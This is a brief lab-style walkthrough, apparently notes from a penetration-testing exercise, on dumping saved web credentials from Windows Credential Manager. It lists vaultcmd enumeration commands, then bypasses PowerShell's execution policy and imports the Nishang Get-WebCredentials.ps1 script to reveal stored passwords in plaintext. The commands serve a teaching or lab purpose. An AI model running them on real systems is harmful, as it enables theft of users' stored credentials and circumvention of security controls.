first, we will be enumerating to see if theres anything inside of 
vaultcmd.

vaultcmd /list

by default, windows has two different vaults, one for web, and the other
for windows machine credentials.

lets check if there is anything stored inside of the web credentials by running
the vaultcmd commmand with /listproperties 
VaultCmd /listproperties:"Web Credentials"

now lets try to list more information using the following:
VaultCmd /listcreds:"Web Credentials"

The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1,
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1

Ensure to execute PowerShell with bypass policy to import it as a module as follows,
powershell -ex bypass

Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials

boom
